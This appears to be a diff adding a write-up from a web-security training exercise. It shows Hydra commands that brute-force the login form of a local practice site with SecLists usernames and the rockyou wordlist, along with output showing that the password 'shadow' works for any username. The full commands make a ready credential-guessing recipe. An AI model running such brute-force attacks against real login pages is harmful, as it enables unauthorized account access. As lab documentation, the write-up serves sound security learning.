@@ -1,0 +1,36 @@
+We tried bruteforcing the login page with some famous wordlists to test for common entry
+
+┌──(amuller㉿Laptop)-[~/Documents/Darkly]
+└─$ sudo hydra -l /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -o hydra.txt 192.168.1.16 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
+
+[sudo] password for amuller: 
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-24 21:44:44
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get-form://192.168.1.16:80/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
+[80][http-get-form] host: 192.168.1.16   login: /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt   password: shadow
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-24 21:45:20
+
+
+Found out there is multiple credentials 
+
+┌──(amuller㉿Laptop)-[~/Documents/Darkly]
+└─$ sudo hydra -L /usr/share/wordlists/SecLists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -o hydra.txt 192.168.1.16 http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-24 21:47:48
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 11877162372 login tries (l:828/p:14344399), ~742322649 tries per task
+[DATA] attacking http-get-form://192.168.1.16:80/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif
+[80][http-get-form] host: 192.168.1.16   login: !root   password: shadow
+[STATUS] 14344477.00 tries/min, 14344477 tries in 00:01h, 11862817895 to do in 13:47h, 16 active
+[80][http-get-form] host: 192.168.1.16   login: $ALOC$   password: shadow
+[80][http-get-form] host: 192.168.1.16   login: $SRV   password: shadow
+[80][http-get-form] host: 192.168.1.16   login: $system   password: shadow
+[80][http-get-form] host: 192.168.1.16   login: (NULL)   password: shadow
+[STATUS] 23907347.00 tries/min, 71722041 tries in 00:03h, 11805440331 to do in 08:14h, 16 active
+[80][http-get-form] host: 192.168.1.16   login: (any)   password: shadow
+
+As long as the password is shadow we good
